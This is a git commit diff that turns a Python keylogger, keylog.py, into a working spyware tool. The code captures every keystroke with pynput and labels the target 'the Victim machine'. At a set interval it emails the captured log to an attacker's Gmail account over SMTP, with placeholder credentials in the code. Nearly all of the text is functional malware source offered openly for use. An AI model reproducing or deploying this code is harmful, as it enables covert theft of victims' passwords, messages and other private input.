1f25d2c6113b7ef97611bac38c4d5c18483a29d1
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-03 12:37:08 -0400

    Final0

--- keylog.py
+++ keylog.py
@@ -1,11 +1,14 @@
 #!/usr/bin/env python
 import pynput.keyboard
 import threading
+import smtplib
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
-
+    def __init__(self, t, emailID, password):
+        self.log = "[+] Keylogger Successfully Started in the Victim machine."
+        self.interval = t
+        self.email = emailID
+        self.passwd = password
     def use_keys(self, key):
         try:
             self.log += str(key.char)
@@ -14,11 +17,19 @@ class Keylogger:
                 self.log += " "
             else:
                 self.log += " [" + str(key) + "] "
+
     def report(self):
-        print(self.log)
+        self.mail_it(self.email, self.passwd, self.email, "\n\n\n" + self.log)
         self.log = ""
-        timer = threading.Timer(10, self.report)
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def mail_it(self, email, passwd, to_mail, msg):
+        mailserver = smtplib.SMTP("smtp.gmail.com", 587)
+        mailserver.starttls()
+        mailserver.login(email, passwd)
+        mailserver.sendmail(email, to_mail, msg)
+        mailserver.quit()
 
     def start(self):
         key_rec = pynput.keyboard.Listener(on_press= self.use_keys)
@@ -26,5 +37,5 @@ class Keylogger:
             self.report()
             key_rec.join()
 
-logger = Keylogger()
+logger = Keylogger(60, "xxxxxxxxxxx@gmail.com", "**********")
 logger.start()
